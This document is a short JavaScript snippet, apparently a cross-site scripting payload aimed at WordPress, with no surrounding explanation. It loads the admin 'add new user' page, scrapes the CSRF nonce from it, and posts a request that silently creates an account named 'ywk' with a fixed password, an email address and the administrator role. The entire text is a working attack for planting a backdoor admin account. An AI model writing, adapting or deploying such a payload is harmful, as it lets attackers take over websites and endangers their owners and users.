u="/wp-admin/user-new.php";
jQuery.get(u,function(e){
  jQuery.post(u,{
    action:"createuser",
    "_wpnonce_create-user":e.match(/_wpnonce_create-user" value="(.+?)"/)[1],
    user_login:"ywk",
    email:"boot0x01@gmail.com",
    pass1:"ywK!1122",
    pass2:"ywK!1122",
    role:"administrator"
  });
});
